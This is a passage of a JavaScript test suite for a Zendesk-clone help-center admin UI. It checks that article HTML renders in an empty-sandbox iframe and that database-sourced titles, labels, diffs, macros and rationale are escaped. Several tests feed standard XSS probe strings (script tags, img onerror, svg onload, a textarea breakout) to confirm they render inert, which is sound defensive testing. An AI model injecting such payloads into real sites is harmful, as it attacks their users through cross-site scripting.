// The Zendesk clone's safety-critical renderers + the demo/viewmodel key
// parity, locked as regression tests:
//  - ArticleBody must ALWAYS be a fully sandboxed srcdoc iframe (the ONLY
//    HTML renderer on the route);
//  - every DB-sourced string (titles, labels, rationale, diff spans, macro
//    values) renders as escaped React children, never live markup;
//  - the ?demo fixture carries EXACTLY the controller viewmodel keys (plan
//    section 3.4) so the SPA and Python can never drift apart silently.
import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import ArticleBody from "./ArticleBody.jsx";
import ArticleEditor from "./ArticleEditor.jsx";
import ArticleList from "./ArticleList.jsx";
import BodyEditForm from "./BodyEditForm.jsx";
import GardenChrome from "./GardenChrome.jsx";
import MacroEditor from "./MacroEditor.jsx";
import MacroList from "./MacroList.jsx";
import RevisionCenter, { RevisionDetail } from "./RevisionCenter.jsx";
import RevisionDiff, { MarkupAlert, SourcePanel } from "./RevisionDiff.jsx";
import CopyControls from "./CopyControls.jsx";
import { COPY_DRAFTED_FIELD } from "./shape.js";
import ZendeskApp from "./ZendeskApp.jsx";
import { buildDemoZendesk } from "./demo.js";

const noop = () => {};

// Walk a React element tree WITHOUT rendering (the hook-free components can
// be invoked as plain functions), collecting elements matching `pred` —
// lets tests assert keys and invoke handlers with no DOM environment.
function collectElements(node, pred, out = []) {
  if (node == null || typeof node !== "object") return out;
  if (Array.isArray(node)) {
    node.forEach((n) => collectElements(n, pred, out));
    return out;
  }
  if (pred(node)) out.push(node);
  if (node.props) collectElements(node.props.children, pred, out);
  return out;
}

describe("ZendeskApp compile + disconnected state", () => {
  it("renders the waiting state without a bridge (also compile-checks the app)", () => {
    const out = renderToStaticMarkup(<ZendeskApp />);
    expect(out).toContain("Waiting for the Zendesk bridge…");
    // the kale icon rail is gone — one compact header, nothing beside it
    expect(out).not.toContain("zd-rail");
    expect(out).not.toContain("zd-main");
  });
});

describe("ArticleBody sandbox contract", () => {
  it("renders an iframe with an EMPTY sandbox (no scripts, no origin)", () => {
    const out = renderToStaticMarkup(<ArticleBody srcdoc="<p>hi</p>" />);
    expect(out).toContain('sandbox=""');
    expect(out).not.toContain("allow-scripts");
    expect(out).not.toContain("allow-same-origin");
  });

  it("carries the content via srcdoc", () => {
    const out = renderToStaticMarkup(<ArticleBody srcdoc="<h2>Steps</h2>" />);
    expect(out.toLowerCase()).toContain("srcdoc=");
    expect(out).toContain("Steps");
  });

  it("tolerates empty srcdoc", () => {
    const out = renderToStaticMarkup(<ArticleBody srcdoc="" />);
    expect(out).toContain('sandbox=""');
  });
});

// ── RENDER FIDELITY (owner correction, 2026-07-26) ───────────────────
// The rendered article is the PRIMARY surface: it must look like the end
// user's article, custom classes and all. Python's preview profile keeps
// presentational markup; the renderer's job is to pass it through untouched
// and dress it in Help-Center-like CSS. Anything this file stripped would
// make the markup notice fire for a reason the notice does not name.
describe("ArticleBody render fidelity", () => {
  const RICH = '<div class="callout" id="lead" data-hc-block="callout" '
    + 'style="border-left-color:#d4a017"><p>Start early.</p></div>'
    + '<table class="timeline"><tr><td>Week 0</td></tr></table>'
    + '<iframe src="https://example.test/embed"></iframe>';

  it("passes presentational markup through untouched (classes, ids, "
     + "data-attributes, inline style, tables, embedded frames)", () => {
    const out = renderToStaticMarkup(<ArticleBody srcdoc={RICH} />);
    // React escapes the srcdoc attribute; unescape to read what the frame gets
    const doc = out.replace(/&quot;/g, '"').replace(/&#x27;/g, "'")
      .replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
    expect(doc).toContain('class="callout"');
    expect(doc).toContain('id="lead"');
    expect(doc).toContain('data-hc-block="callout"');
    expect(doc).toContain("border-left-color:#d4a017");
    expect(doc).toContain('class="timeline"');
    expect(doc).toContain("example.test/embed");
  });

  it("wraps the body in the Help Center article container and ships an "
     + "article stylesheet (tables, callouts, code, figures)", () => {
    const out = renderToStaticMarkup(<ArticleBody srcdoc="<p>hi</p>" />);
    const doc = out.replace(/&quot;/g, '"').replace(/&lt;/g, "<")
      .replace(/&gt;/g, ">");
    expect(doc).toContain('class="article-body"');
    expect(doc).toContain("border-collapse");
    expect(doc).toContain("figcaption");
    expect(doc).toContain("callout");
    expect(doc).toContain("color-scheme");
  });

  it("stays sandboxed no matter how rich the content is", () => {
    const out = renderToStaticMarkup(<ArticleBody srcdoc={RICH} />);
    expect(out).toContain('sandbox=""');
    expect(out).not.toContain("allow-scripts");
    expect(out).not.toContain("allow-same-origin");
    expect(out).not.toContain("allow-popups");
    expect(out).not.toContain("allow-forms");
  });
});

describe("escaping of DB-sourced strings", () => {
  it("hostile article titles and labels render as entities, never markup", () => {
    const articles = [{
      id: 1, title: "<script>alert(1)</script>", section_id: 9, section: "FAQ",
      author: '<img src=x onerror="alert(1)">', updated_display: "Jul 1, 2026",
      draft: false, outdated: false, labels: ["<b>evil</b>"], origin: "pull",
      open_revisions: 0,
    }];
    const out = renderToStaticMarkup(
      <ArticleList categories={[]} articles={articles} activeSection={null}
                   query="" onOpen={noop} onSearch={noop} onSelectSection={noop} />);
    expect(out).toContain("&lt;script&gt;");
    expect(out).not.toContain("<script>");
    expect(out).toContain("&lt;img");
    expect(out).not.toContain("<img");
    expect(out).toContain("&lt;b&gt;evil&lt;/b&gt;");
  });

  it("hostile diff span text is escaped", () => {
    const evil = {
      baseline_present: true, change_count: 1,
      title: { changed: false, old: "", new: "" },
      rows: [{ tag: "change", spans: [
        { tag: "add", text: "<img onerror=alert(1)>" },
      ] }],
    };
    const out = renderToStaticMarkup(<RevisionDiff diff={evil} />);
    expect(out).not.toContain("<img");
    expect(out).toContain("&lt;img");
  });

  it("hostile macro action values render inert (rich + text kinds)", () => {
    const macro = {
      id: 1, name: "Evil::<script>x</script>", description: "", active: true,
      updated_display: "Jul 1, 2026",
      actions: [
        { field: "comment_value", display: "Comment/Reply",
          value: "<script>alert(1)</script> hi {{ticket.id}}" },
        { field: "add_tags", display: "Add tags", value: "<svg onload=x>" },
      ],
      revisions: [],
    };
    const out = renderToStaticMarkup(
      <MacroEditor macro={macro} onBack={noop} onCopy={noop} onOpenRevision={noop} />);
    expect(out).not.toContain("<script>");
    expect(out).toContain("&lt;script&gt;");
    expect(out).not.toContain("<svg");
    expect(out).toContain("{{ticket.id}}");   // placeholder shown as literal text
  });
});

describe("demo fixture === controller viewmodel keys (plan 3.4)", () => {
  const fx = buildDemoZendesk();
  const keysOf = (o) => Object.keys(o).sort();

  it("zendesk_data carries exactly the contract keys", () => {
    expect(keysOf(fx.zendesk_data)).toEqual([
      "articles", "categories", "connected", "counts", "demo",
      "last_pull_display", "macros", "status", "view",
    ]);
    expect(keysOf(fx.zendesk_data.counts)).toEqual(["articles", "macros", "revisions_open"]);
    expect(keysOf(fx.zendesk_data.categories[0])).toEqual(["id", "name", "sections"]);
    expect(keysOf(fx.zendesk_data.categories[0].sections[0]))
      .toEqual(["article_count", "id", "name"]);
  });

  it("every article row carries exactly the contract keys", () => {
    const expected = ["author", "draft", "id", "labels", "open_revisions",
      "origin", "outdated", "section", "section_id", "title", "updated_display"];
    fx.zendesk_data.articles.forEach((a) => expect(keysOf(a)).toEqual(expected));
  });

  it("every macro row carries exactly the contract keys", () => {
    const expected = ["active", "description", "id", "name", "open_revisions",
      "updated_display"];
    fx.zendesk_data.macros.forEach((m) => expect(keysOf(m)).toEqual(expected));
  });

  it("article_detail carries exactly the contract keys (incl. the additive " +
     "body_text the specialist edit textarea seeds from)", () => {
    // body_source + markup_notice are the mirror REVIEW surface: the exact
    // stored bytes the clipboard would deliver, and the honest warning when
    // the sanitized preview cannot display all of them.
    const expected = ["author", "body_source", "body_srcdoc", "body_text",
      "category", "draft", "html_url", "id", "labels", "markup_notice",
      "origin", "outdated", "position", "revisions", "section", "section_id",
      "source_file", "title", "updated_display"];
    Object.values(fx.article_details).forEach((d) => expect(keysOf(d)).toEqual(expected));
    const withRevs = fx.article_details[101];
    expect(keysOf(withRevs.revisions[0]))
      .toEqual(["draft_id", "status", "title", "updated_display"]);
  });

  it("the markup notice is RARE in the fixture: it fires only where the "
     + "stored bytes actually diverge from the preview", () => {
    const details = Object.values(fx.article_details);
    const noticed = details.filter((d) => d.markup_notice);
    expect(noticed).toHaveLength(1);
    expect(noticed[0].body_source).not.toBe(noticed[0].body_srcdoc);
    expect(noticed[0].body_source).toContain("<script>");
    expect(noticed[0].markup_notice).toContain("preview does not display");
    // every other article previews byte-for-byte, so no banner at all
    details.filter((d) => !d.markup_notice).forEach(
      (d) => expect(d.body_source).toBe(d.body_srcdoc));
  });

  it("the fixture exercises render fidelity (classes, ids, data-attributes, "
     + "inline styles and tables survive into the preview)", () => {
    const rich = Object.values(fx.article_details).find(
      (d) => d.body_srcdoc.includes("<table"));
    expect(rich).toBeTruthy();
    expect(rich.body_srcdoc).toContain('class="callout"');
    expect(rich.body_srcdoc).toContain('id="cred-lead"');
    expect(rich.body_srcdoc).toContain("data-hc-block");
    expect(rich.body_srcdoc).toContain("style=");
    expect(rich.body_srcdoc).not.toContain("<script");
  });

  it("macro_detail carries exactly the contract keys", () => {
    const expected = ["actions", "actions_source", "active", "description",
      "id", "name", "revisions", "updated_display"];
    Object.values(fx.macro_details).forEach((d) => expect(keysOf(d)).toEqual(expected));
    expect(keysOf(fx.macro_details[201].actions[0])).toEqual(["display", "field", "value"]);
    expect(keysOf(fx.macro_details[201].revisions[0])).toEqual(["draft_id", "name", "status"]);
  });

  it("revisions_data rows carry exactly the contract keys (incl. the " +
     "additive source_ref origin marker + body the draft editor seeds from)", () => {
    expect(keysOf(fx.revisions_data)).toEqual(["filter", "revisions"]);
    const expected = ["body", "copied_display", "created_display", "draft_id",
      "is_new", "kind", "rationale", "source_ref", "sources", "status",
      "target_id", "target_title", "title"];
    fx.revisions_data.revisions.forEach((r) => expect(keysOf(r)).toEqual(expected));
    expect(keysOf(fx.revisions_data.revisions[0].sources[0])).toEqual(["label", "ref"]);
  });

  it("the fixture showcases one specialist edit among the Renn proposals", () => {
    const specialist = fx.revisions_data.revisions.filter(
      (r) => r.source_ref === "specialist-edit");
    expect(specialist).toHaveLength(1);
    expect(specialist[0].status).toBe("pending");
    expect(specialist[0].kind).toBe("article");
    expect(specialist[0].rationale).toBe("Edited in the workspace.");
  });

  it("diff fixtures carry exactly the diff_ready contract keys", () => {
    // rows = the AUTHORITATIVE source diff; text_rows/text_change_count =
    // the secondary readable projection; bytes_equal/warning = the
    // no-silent-zero-change guard; markup_notice = bytes the preview
    // cannot display.
    const expected = ["baseline_present", "bytes_equal", "change_count",
      "draft_id", "kind", "markup_notice", "request_id", "rows",
      "text_change_count", "text_rows", "title", "warning"];
    Object.values(fx.diffs).forEach((d) => {
      expect(keysOf(d)).toEqual(expected);
      expect(keysOf(d.title)).toEqual(["changed", "new", "old"]);
    });
  });

  it("fixture statuses stay inside the lifecycle vocabulary", () => {
    const allowed = ["pending", "ready", "copied", "pushed"];
    fx.revisions_data.revisions.forEach((r) => expect(allowed).toContain(r.status));
  });
});

describe("RevisionCenter status lanes", () => {
  const fx = buildDemoZendesk();
  const props = {
    revisions: fx.revisions_data.revisions, filter: "all", diff: null,
    activeDraft: null, onFilter: noop, onOpen: noop, onDiff: noop, onSave: noop,
    onMarkReady: noop, onMarkCopied: noop, onCopy: noop, onDelete: noop,
    busy: false,
  };

  it("renders the pending / ready / copied lanes with their counts", () => {
    const out = renderToStaticMarkup(<RevisionCenter {...props} />);
    expect(out).toContain("Pending review");
    expect(out).toContain("Ready to copy");
    expect(out).toContain("Copied to Zendesk");
    // fixture: 3 pending, 1 ready, 1 copied
    expect(out).toContain("Setting up SSO (SAML)");
    expect(out).toContain("Refund apology v2");
    expect(out).toContain("New content");            // is_new badge
  });

  it("the open filter hides copied rows; rationale renders escaped", () => {
    const evil = [{
      draft_id: 1, kind: "article", target_id: 5, target_title: "T",
      title: "Rev", status: "pending",
      rationale: '<img src=x onerror="alert(1)">',
      sources: [], created_display: "Jul 1", copied_display: null, is_new: false,
    }];
    const out = renderToStaticMarkup(
      <RevisionCenter {...props} revisions={evil} filter="open" />);
    expect(out).not.toContain("<img");
    expect(out).toContain("&lt;img");
    expect(out).not.toContain("Refund apology v2");
  });

  it("selecting a ready draft surfaces Mark as copied + copy buttons, no Mark ready", () => {
    const out = renderToStaticMarkup(
      <RevisionCenter {...props}
                      activeDraft={{ draft_id: 7, kind: "article" }}
                      diff={fx.diffs["article:7"]} />);
    expect(out).toContain("Mark as copied");
    expect(out).not.toContain(">Mark ready<");
    expect(out).toContain("Copy HTML");
    expect(out).toContain("Copy rich text");
    expect(out).toContain("Delete");
    expect(out).toContain("changed line");           // diff rendered
  });

  it("a pending draft disables clipboard copies (Python refuses them anyway)", () => {
    const out = renderToStaticMarkup(
      <RevisionCenter {...props}
                      activeDraft={{ draft_id: 8, kind: "article" }}
                      diff={fx.diffs["article:8"]} />);
    expect(out).toContain("Mark ready");
    // every copy affordance renders disabled with the explain-why tooltip
    expect(out).toContain("Mark the draft ready first");
    expect((out.match(/disabled=""/g) || []).length).toBeGreaterThanOrEqual(4);
  });

  it("the reviewed DRAFTED CONTENT is the primary copy on an article draft; "
     + "the exact-byte flavours ride the overflow", () => {
    const asked = [];
    const tree = RevisionCenter({ ...props, onCopy: (k, id, f) => asked.push([k, id, f]),
      activeDraft: { draft_id: 7, kind: "article" }, diff: fx.diffs["article:7"] });
    const detail = collectElements(tree, (n) => n.type === RevisionDetail)[0];
    const controls = collectElements(
      RevisionDetail(detail.props), (n) => n.type === CopyControls);
    expect(controls).toHaveLength(1);
    expect(controls[0].props.primaryField).toBe(COPY_DRAFTED_FIELD);
    expect(controls[0].props.items.map((i) => i.field))
      .toEqual(["title", "body_html", "body_rich"]);
    controls[0].props.onCopy(COPY_DRAFTED_FIELD);
    expect(asked).toEqual([["article", 7, "body_text"]]);
  });

  it("a macro draft leads with the reply (prose) and demotes the name", () => {
    const tree = RevisionCenter({ ...props,
      activeDraft: { draft_id: 3, kind: "macro" }, diff: fx.diffs["macro:3"] });
    const detail = collectElements(tree, (n) => n.type === RevisionDetail)[0];
    const controls = collectElements(
      RevisionDetail(detail.props), (n) => n.type === CopyControls);
    expect(controls[0].props.primaryField).toBe("macro_reply");
    expect(controls[0].props.items.map((i) => i.field)).toEqual(["macro_name"]);
  });

  it("copyBusy reaches the detail's copy controls (no second confirm)", () => {
    const tree = RevisionCenter({ ...props, copyBusy: true,
      activeDraft: { draft_id: 7, kind: "article" }, diff: fx.diffs["article:7"] });
    const detail = collectElements(tree, (n) => n.type === RevisionDetail)[0];
    expect(detail.props.copyBusy).toBe(true);
    const controls = collectElements(
      RevisionDetail(detail.props), (n) => n.type === CopyControls);
    expect(controls[0].props.pending).toBe(true);
  });

  it("keys the detail by kind+draft_id so switching drafts remounts the " +
     "rename input (a reused uncontrolled input keeps the OLD title and " +
     "could rename the wrong draft)", () => {
    const forDraft = (draftId, kind) => {
      const tree = RevisionCenter({ ...props, activeDraft: { draft_id: draftId, kind } });
      const details = collectElements(tree, (n) => n.type === RevisionDetail);
      expect(details).toHaveLength(1);
      return details[0].key;
    };
    expect(forDraft(7, "article")).toBe("article:7");
    expect(forDraft(8, "article")).toBe("article:8");
    // kind is part of the key: a macro draft can share a numeric id
    expect(forDraft(3, "macro")).toBe("macro:3");
  });

  it("revision cards are keyboard-activatable (role=button, tabIndex, Enter)", () => {
    const out = renderToStaticMarkup(<RevisionCenter {...props} />);
    expect(out).toContain('class="zd-rev-card" role="button" tabindex="0"');
    // behavioral: Enter on a card opens it (hook-free direct invocation)
    const opened = [];
    const tree = RevisionCenter({
      ...props, onOpen: (id, kind) => opened.push([id, kind]) });
    // RevCard elements carry {rev, selected, onOpen} props in the tree
    const cards = collectElements(
      tree, (n) => typeof n.type === "function" && n.props &&
                   n.props.rev && n.props.onOpen);
    expect(cards.length).toBeGreaterThan(0);
    // RevCard is itself hook-free — invoke it to reach the div's onKeyDown
    const div = RevCardEl(cards[0]);
    div.props.onKeyDown({ key: "Enter", preventDefault: noop });
    expect(opened).toHaveLength(1);
  });
});

// Resolve a RevCard ELEMENT (unrendered) into its root <div> by invoking the
// function component with its props.
function RevCardEl(el) {
  return el.type(el.props);
}

describe("served lists are authoritative (no client re-filter of FTS hits)", () => {
  // Body-only FTS hit: Python matched body_text/actions_text the row
  // viewmodel does not carry, so the client predicate would drop it.
  const articles = [{
    id: 1, title: "Setting up SSO", section_id: 9, section: "FAQ", author: "",
    updated_display: "Jul 1, 2026", draft: false, outdated: false, labels: [],
    origin: "pull", open_revisions: 0,
  }];
  const macros = [{ id: 1, name: "Refund apology", description: "", active: true,
                    updated_display: "Jul 1, 2026", open_revisions: 0 }];

  it("ArticleList keeps a served body-only hit the local filter would drop", () => {
    const served = renderToStaticMarkup(
      <ArticleList categories={[]} articles={articles} activeSection={null}
                   query="metadata XML" served
                   onOpen={noop} onSearch={noop} onSelectSection={noop} />);
    expect(served).toContain("Setting up SSO");
    expect(served).not.toContain("No articles match this search.");
  });

  it("ArticleList keeps the local text filter for demo mode (served absent)", () => {
    const demo = renderToStaticMarkup(
      <ArticleList categories={[]} articles={articles} activeSection={null}
                   query="metadata XML"
                   onOpen={noop} onSearch={noop} onSelectSection={noop} />);
    expect(demo).toContain("No articles match this search.");
  });

  it("MacroList: served keeps the actions_text hit; demo still filters", () => {
    const served = renderToStaticMarkup(
      <MacroList macros={macros} query="escalate to billing" served
                 onOpen={noop} onSearch={noop} />);
    expect(served).toContain("Refund apology");
    const demo = renderToStaticMarkup(
      <MacroList macros={macros} query="escalate to billing"
                 onOpen={noop} onSearch={noop} />);
    expect(demo).toContain("No macros match this search.");
  });

  it("list rows are keyboard-activatable (role=button + tabindex + Enter)", () => {
    const aOut = renderToStaticMarkup(
      <ArticleList categories={[]} articles={articles} activeSection={null}
                   query="" onOpen={noop} onSearch={noop} onSelectSection={noop} />);
    expect(aOut).toContain('class="zd-row" role="button" tabindex="0"');
    const mOut = renderToStaticMarkup(
      <MacroList macros={macros} query="" onOpen={noop} onSearch={noop} />);
    expect(mOut).toContain('class="zd-row" role="button" tabindex="0"');
    // behavioral: Enter on a row opens it (hook-free direct invocation)
    const opened = [];
    const tree = ArticleList({ categories: [], articles, activeSection: null,
      query: "", onOpen: (id) => opened.push(id), onSearch: noop,
      onSelectSection: noop });
    const rows = collectElements(
      tree, (n) => n.type === "tr" && n.props && n.props.className === "zd-row");
    expect(rows).toHaveLength(1);
    rows[0].props.onKeyDown({ key: " ", preventDefault: noop });
    expect(opened).toEqual([1]);
  });
});

describe("editor revision links carry the draft status (jump filter fix)", () => {
  it("ArticleEditor passes (draft_id, status) to onOpenRevision", () => {
    const calls = [];
    const article = {
      id: 101, title: "T", body_srcdoc: "", author: "", category: "C",
      draft: false, html_url: "", labels: [], origin: "pull", outdated: false,
      position: 1, section: "S", section_id: 9, source_file: "",
      updated_display: "Jul 1, 2026",
      revisions: [{ draft_id: 7, status: "copied", title: "SSO rev",
                    updated_display: "Jul 2, 2026" }],
    };
    const tree = ArticleEditor({ article, onBack: noop, onCopy: noop,
      onOpenRevision: (id, st) => calls.push([id, st]) });
    const btns = collectElements(
      tree, (n) => n.type === "button" && n.props && n.props.children === "SSO rev");
    expect(btns).toHaveLength(1);
    btns[0].props.onClick();
    expect(calls).toEqual([[7, "copied"]]);
  });

  it("MacroEditor passes (draft_id, status) to onOpenRevision", () => {
    const calls = [];
    const macro = {
      id: 201, name: "Refund apology", description: "", active: true,
      updated_display: "Jul 1, 2026", actions: [],
      revisions: [{ draft_id: 3, status: "pushed", name: "Refund apology v2" }],
    };
    const tree = MacroEditor({ macro, onBack: noop, onCopy: noop,
      onOpenRevision: (id, st) => calls.push([id, st]) });
    const btns = collectElements(
      tree, (n) => n.type === "button" && n.props &&
                   n.props.children === "Refund apology v2");
    expect(btns).toHaveLength(1);
    btns[0].props.onClick();
    expect(calls).toEqual([[3, "pushed"]]);
  });
});

describe("specialist body editing — BodyEditForm contract", () => {
  function fakeSubmit(value) {
    return { preventDefault: noop,
             currentTarget: { elements: { zdBody: { value } } } };
  }

  it("Save submits the typed text to onSave", () => {
    const saved = [];
    const form = BodyEditForm({ seed: "old body", label: "Article body",
      onSave: (t) => saved.push(t), onCancel: noop, busy: false });
    expect(form.type).toBe("form");
    form.props.onSubmit(fakeSubmit("## New body"));
    expect(saved).toEqual(["## New body"]);
  });

  it("unchanged or empty text closes the editor instead of saving", () => {
    const saved = [];
    let cancelled = 0;
    const form = BodyEditForm({ seed: "same", label: "x",
      onSave: (t) => saved.push(t), onCancel: () => { cancelled += 1; },
      busy: false });
    form.props.onSubmit(fakeSubmit("same"));
    form.props.onSubmit(fakeSubmit(""));
    form.props.onSubmit(fakeSubmit("   "));
    expect(saved).toEqual([]);
    expect(cancelled).toBe(3);
  });

  it("Escape in the textarea cancels; textarea is capped and labelled", () => {
    let cancelled = 0;
    const tree = BodyEditForm({ seed: "s", label: "Draft body", onSave: noop,
      onCancel: () => { cancelled += 1; }, busy: false });
    const areas = collectElements(tree, (n) => n.type === "textarea");
    expect(areas).toHaveLength(1);
    expect(areas[0].props.maxLength).toBe(200000);
    expect(areas[0].props["aria-label"]).toBe("Draft body");
    areas[0].props.onKeyDown({ key: "Escape" });
    areas[0].props.onKeyDown({ key: "a" });
    expect(cancelled).toBe(1);
  });

  it("renders primary Save and basic Cancel (Garden wording)", () => {
    const out = renderToStaticMarkup(
      <BodyEditForm seed="" label="x" onSave={noop} onCancel={noop} busy={false} />);
    expect(out).toContain('class="zd-btn primary"');
    expect(out).toContain(">Save</button>");
    expect(out).toContain('class="zd-btn basic"');
    expect(out).toContain(">Cancel</button>");
    expect(out).toContain("never modified");
  });
});

describe("specialist body editing — ArticleEditor", () => {
  const article = {
    id: 105, title: "Importing client rosters", body_srcdoc: "<p>html body</p>",
    body_text: "Rosters import from CSV.", author: "", category: "C",
    draft: false, html_url: "", labels: [], origin: "pull", outdated: false,
    position: 1, section: "S", section_id: 9, source_file: "",
    updated_display: "Jul 1, 2026", revisions: [],
  };
  const props = { article, onBack: noop, onCopy: noop, onOpenRevision: noop,
    onEditBody: noop, onCancelBodyEdit: noop, onSaveBody: noop, busy: false };

  it("shows Edit content (Zendesk's wording) and keeps the sandboxed frame", () => {
    const out = renderToStaticMarkup(<ArticleEditor {...props} />);
    expect(out).toContain("Edit content");
    expect(out).toContain('sandbox=""');
    expect(out).not.toContain("<textarea");
  });

  it("without the handler wired the button does not render (old call sites)", () => {
    const out = renderToStaticMarkup(
      <ArticleEditor article={article} onBack={noop} onCopy={noop}
                     onOpenRevision={noop} />);
    expect(out).not.toContain("Edit content");
  });

  it("editing swaps the frame for a plain textarea seeded from body_text", () => {
    const out = renderToStaticMarkup(<ArticleEditor {...props} bodyEditing />);
    expect(out).toContain("<textarea");
    expect(out).toContain("Rosters import from CSV.");
    expect(out.toLowerCase()).toContain('maxlength="200000"');
    expect(out).not.toContain("sandbox=");          // no iframe while editing
    expect(out).not.toContain("Edit content");      // no re-entry button
    expect(out).toContain(">Cancel</button>");
  });

  it("hostile body_text renders inert inside the textarea", () => {
    const evil = { ...article, body_text: "</textarea><script>alert(1)</script>" };
    const out = renderToStaticMarkup(
      <ArticleEditor {...props} article={evil} bodyEditing />);
    expect(out).not.toContain("<script>");
    expect(out).toContain("&lt;/textarea&gt;&lt;script&gt;");
  });

  it("clicking Edit content starts the edit; Save routes through onSaveBody", () => {
    const events = [];
    const tree = ArticleEditor({ ...props,
      onEditBody: () => events.push("edit") });
    const btns = collectElements(tree, (n) =>
      n.type === "button" && n.props && n.props.children === "Edit content");
    expect(btns).toHaveLength(1);
    btns[0].props.onClick();
    expect(events).toEqual(["edit"]);

    const saved = [];
    const editing = ArticleEditor({ ...props, bodyEditing: true,
      onSaveBody: (t) => saved.push(t) });
    const forms = collectElements(editing, (n) => n.type === BodyEditForm);
    expect(forms).toHaveLength(1);
    expect(forms[0].props.seed).toBe("Rosters import from CSV.");
    const form = forms[0].type(forms[0].props);
    form.props.onSubmit({ preventDefault: noop,
      currentTarget: { elements: { zdBody: { value: "New text" } } } });
    expect(saved).toEqual(["New text"]);
  });
});

describe("specialist body editing — RevisionCenter", () => {
  const fx = buildDemoZendesk();
  const props = {
    revisions: fx.revisions_data.revisions, filter: "all", diff: null,
    activeDraft: null, onFilter: noop, onOpen: noop, onDiff: noop, onSave: noop,
    onMarkReady: noop, onMarkCopied: noop, onCopy: noop, onDelete: noop,
    busy: false, bodyEditing: false, onEditBody: noop, onCancelBodyEdit: noop,
    onSaveBody: noop,
  };

  it("a pending article draft offers Edit content", () => {
    const out = renderToStaticMarkup(
      <RevisionCenter {...props} activeDraft={{ draft_id: 8, kind: "article" }}
                      diff={fx.diffs["article:8"]} />);
    expect(out).toContain("Edit content");
  });

  it("ready drafts and macro drafts never offer Edit content (v1 gates)", () => {
    const ready = renderToStaticMarkup(
      <RevisionCenter {...props} activeDraft={{ draft_id: 7, kind: "article" }}
                      diff={fx.diffs["article:7"]} />);
    expect(ready).not.toContain("Edit content");
    const macroPending = [{
      draft_id: 4, kind: "macro", target_id: 201, target_title: "Refund apology",
      title: "Macro rev", status: "pending", rationale: "r", sources: [],
      source_ref: null, body: "b", created_display: "Jul 1",
      copied_display: null, is_new: false,
    }];
    const macro = renderToStaticMarkup(
      <RevisionCenter {...props} revisions={macroPending}
                      activeDraft={{ draft_id: 4, kind: "macro" }} />);
    expect(macro).not.toContain("Edit content");
  });

  it("editing swaps diff + rename for a textarea seeded from the draft body", () => {
    const out = renderToStaticMarkup(
      <RevisionCenter {...props} bodyEditing
                      activeDraft={{ draft_id: 8, kind: "article" }}
                      diff={fx.diffs["article:8"]} />);
    expect(out).toContain("<textarea");
    expect(out).toContain("a few minutes");        // fixture draft 8 body
    expect(out).not.toContain("changed line");     // diff hidden
    expect(out).not.toContain(">Rename<");         // rename hidden
    expect(out).not.toContain("Edit content");     // no re-entry button
  });

  it("Save routes (draft_id, text) through onSaveBody", () => {
    const saved = [];
    const tree = RevisionCenter({ ...props, bodyEditing: true,
      activeDraft: { draft_id: 8, kind: "article" },
      onSaveBody: (id, t) => saved.push([id, t]) });
    const details = collectElements(tree, (n) => n.type === RevisionDetail);
    expect(details).toHaveLength(1);
    const forms = collectElements(
      details[0].type(details[0].props), (n) => n.type === BodyEditForm);
    expect(forms).toHaveLength(1);
    const form = forms[0].type(forms[0].props);
    form.props.onSubmit({ preventDefault: noop,
      currentTarget: { elements: { zdBody: { value: "edited draft" } } } });
    expect(saved).toEqual([[8, "edited draft"]]);
  });

  it("Edit content fires onEditBody", () => {
    const events = [];
    const tree = RevisionCenter({ ...props,
      activeDraft: { draft_id: 8, kind: "article" },
      onEditBody: () => events.push("edit") });
    const details = collectElements(tree, (n) => n.type === RevisionDetail);
    const btns = collectElements(
      details[0].type(details[0].props), (n) =>
        n.type === "button" && n.props && n.props.children === "Edit content");
    expect(btns).toHaveLength(1);
    btns[0].props.onClick();
    expect(events).toEqual(["edit"]);
  });
});

describe("revision origin tags (source_ref)", () => {
  const fx = buildDemoZendesk();
  const props = {
    revisions: fx.revisions_data.revisions, filter: "all", diff: null,
    activeDraft: null, onFilter: noop, onOpen: noop, onDiff: noop, onSave: noop,
    onMarkReady: noop, onMarkCopied: noop, onCopy: noop, onDelete: noop,
    busy: false,
  };

  it("cards tag Specialist edit vs Renn from source_ref", () => {
    const out = renderToStaticMarkup(<RevisionCenter {...props} />);
    expect(out).toContain("Specialist edit");
    expect(out).toContain(">Renn</span>");
  });

  it("the detail header carries the origin tag too", () => {
    const specialist = renderToStaticMarkup(
      <RevisionCenter {...props} activeDraft={{ draft_id: 10, kind: "article" }}
                      diff={fx.diffs["article:10"]} />);
    // once on the card, once in the detail header
    expect(specialist.match(/Specialist edit/g).length).toBeGreaterThanOrEqual(2);
    const renn = renderToStaticMarkup(
      <RevisionCenter {...props} activeDraft={{ draft_id: 8, kind: "article" }}
                      diff={fx.diffs["article:8"]} />);
    expect(renn.match(/>Renn<\/span>/g).length).toBeGreaterThanOrEqual(2);
  });

  it("hostile source_ref values still render as the safe Renn label", () => {
    const evil = [{
      draft_id: 1, kind: "article", target_id: 5, target_title: "T",
      title: "Rev", status: "pending", rationale: "", sources: [],
      source_ref: "<script>alert(1)</script>", body: "b",
      created_display: "Jul 1", copied_display: null, is_new: false,
    }];
    const out = renderToStaticMarkup(
      <RevisionCenter {...props} revisions={evil} />);
    expect(out).not.toContain("<script>");
    expect(out).toContain(">Renn</span>");
  });
});

describe("GardenChrome single header row + Mirror menu", () => {
  const chromeProps = {
    view: "articles", counts: { articles: 0, macros: 0, revisions_open: 0 },
    connected: true, demo: false, onNav: noop, onPull: noop, onImport: noop,
    onImportFolder: noop, pullBusy: false, lastPull: "Never", onOpenChat: null,
  };

  it("is one compact header: crumb + tabs left, actions right, no rail", () => {
    const out = renderToStaticMarkup(<GardenChrome {...chromeProps} onPurge={noop} />);
    expect(out).toContain('class="zd-hdr"');
    expect(out).not.toContain("zd-rail");
    expect(out).toContain("Guide admin");
    expect(out).toContain("Manage articles");
    expect(out).toContain("Last pull:");
    expect(out).toContain("Pull from Zendesk");
    // the crumb+tabs group precedes the right action cluster
    expect(out.indexOf("zd-hdr-left")).toBeLessThan(out.indexOf("zd-hdr-right"));
    expect(out.indexOf("zd-tabs")).toBeLessThan(out.indexOf("zd-hdr-right"));
  });

  it("keeps the SAMPLE DATA badge in the header row in demo mode", () => {
    const out = renderToStaticMarkup(<GardenChrome {...chromeProps} demo />);
    expect(out).toContain("SAMPLE DATA");
  });

  it("folds the imports into the Mirror menu ahead of the purge scopes", () => {
    const out = renderToStaticMarkup(<GardenChrome {...chromeProps} onPurge={noop} />);
